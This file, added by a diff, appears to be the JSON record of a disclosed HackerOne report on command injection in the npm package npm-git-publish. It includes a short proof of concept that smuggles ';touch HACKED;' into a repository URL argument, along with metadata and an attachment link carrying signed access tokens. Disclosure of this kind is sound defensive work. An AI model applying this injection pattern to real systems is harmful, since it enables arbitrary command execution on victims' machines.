@@ -1,0 +1,134 @@
+{
+  "id": 730121,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzAxMjE=",
+  "url": "https://hackerone.com/reports/730121",
+  "title": "[npm-git-publish] RCE via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-05T21:31:12.464Z",
+  "submitted_at": "2019-11-05T21:31:12.464Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mik317",
+    "url": "/mik317",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-01-11T12:08:21.335Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-01-11T12:08:14.855Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `RCE` issue in the `npm-git-publish` module.\nIt allows to execute `arbitrary commands remotely inside the victim's PC`\n\n# Module\n**module name:** `npm-git-publish`\n**version:** `0.2.4-beta`\n**npm page:** `https://www.npmjs.com/package/npm-git-publish`\n\n## Module Description\n> Share/publish private packages using Git remotes!\n\n## Module Stats\n[~70] downloads in the last day\n[268] downloads in the last week\n[~1k] downloads in the last month\n\n## Vulnerability Description\nThe issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/theoy/npm-git-publish/blob/master/lib/publish.ts#L151\n\n## Steps To Reproduce:\n1. Create the following PoC file:\n\n```js\n// poc.js\nvar git = require('npm-git-publish');\ngit.publish('.', 'http://gihub.com ;touch HACKED; #')\n\n```\n1. Check there aren't files called `HACKED` \n1. Execute the following commands in another terminal:\n\n```bash\nnpm i npm-git-publish # Install affected module\nnode poc.js #  Run the PoC\n```\n1. Recheck the files: now `HACKED` has been created :) {F626780}\n\n## Patch\n> Don't format `commands` using insecure `user's inputs` :)\n\n## Supporting Material/References:\n- [OPERATING SYSTEM VERSION]: Kali Linux\n- [NODEJS VERSION]: 10.16.3\n- [NPM VERSION]: 6.0.9\n\n# Wrap up\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\n`RCE` via command formatting on `npm-git-publish`",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 626780,
+      "file_name": "Screenshot_from_2019-11-05_22-27-27.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sQovYHcCXxFeoPamgbNuA5ot?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-11-05_22-27-27.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-11-05_22-27-27.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTABFVXIV%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T124939Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARSTUTlLtqfCtFxZFk4rYBghKF7D2jkZPr1QwTWq%2BGXAiEAv6miAxW0spzaBwsrYsw578P9GcnLl7tkD3KSwPtv%2FLcqsQUIExADGgwwMTM2MTkyNzQ4NDkiDMRzqVS0jkm%2Bv4Wa5CqOBR76uTTT2nWrSXGgdyoE1NtYArYx2zNugI3zy19%2F0NbNPsgMq%2BVIwUVMaICZwERNFM3Ynuw2lLcwlMZcx%2BKlA46VydjCvjJdSq3rZg3mrz6TCgarB3l3mOWRfQE7%2B6R5kd6pEt%2BXzCzO7Oz%2ByqGuVWwSEJgTeLJZFuKmcZSMr%2F86UgsB2gwp%2FZD%2BVvNNEwLTJDQTpmL172aomVt9oe7CwNNlZLemIjD6ujwNcLYWjNdCqcLsLveQ8eNBidevZY5USEd4wbLhH1SUQr2qg2HOFblt%2B9N18%2FzvHhQARS4%2FBs1utdgFK9di6S9hbUMavj%2FiVFcgVamg5XDadOYJfrZhMLXjs7JFoR5LI%2FxLOH6gufc39sOgW1jEXlKXX4F3gv5U0Ts3ncRxb6pUdDsqKHC11mIkJzZIfP0cdJZBykZmj%2BvkVm9hiT6L3B7y87YPSkairkgvBvuGNRdIxrNI%2F%2FH1eBRFxB9M%2B4gteUwrNQJ3zAOkBciHqDn%2BbYeR3FV2E4lYSNE0XEAd9ckVJk7zzITpTf%2Bqb2FJOl%2FGAUlM23wNxMVUUoKJfiCGUkFWaow4qptq6hpqUcQnpV9dRsOQUNFJZbSpdMwxTdu04nTB3fj7FMFhytDsNGl0x7bt5j2q58omJl5C41S4%2FwY0Xi7WkZxLvdxluHJpi2RxUWhNtpPQ88YCWMxi44HqDZ2FbWgM9VKZE1DGp0ml3eOOwdDQ5J3XAjG2g%2Fk5IRoMcX5ftfIjKzhs9JcgUtV%2FU2%2F5obSwXDm7OavJTNxLUTMWvO7BE78PSdr7FfUttD%2Fzh5Eog0%2F0nIlKw5MTl9P%2BtgACFqhih6dbvCfJ4yEfeChQ4s4RzK76W4zN4wdMmUwWJ3uf7I2xDzDomL%2FGBjqxAQjtEZAT4Ko0QTziHMwTUt45mr9X4bfKK2Aye%2F5C%2BNagm7ta0vwtP6vYQ3T9%2BWfsLrtvmlq2L5%2Bx4hQxDkQ4JX%2BhE7mNJwl633WTs4TPq9nosYvDd2GoZsXK5qqlsMIFl%2FShYPbzhH7eSCWgR6f5ZWkkX%2FDBkZ3Mt%2FPqqLHgMblgxWEB1fDGiCVYkb%2B16GM2CiNvSbYRIOcrNOa%2BgAm%2BfS%2FG3fn67R%2FB%2BtcmMCeqNEcnmA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=38b16f68d68fb757f33569e4751b77cb3a06347516efd271075c0e175eb30900",
+      "file_size": 242366,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-02-10T12:08:14.959Z",
+  "allow_singular_disclosure_after": -177122484.85951674,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "rook1337",
+    "bl4de",
+    "densdo"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "physical",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 42495,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "npm-git-publish",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
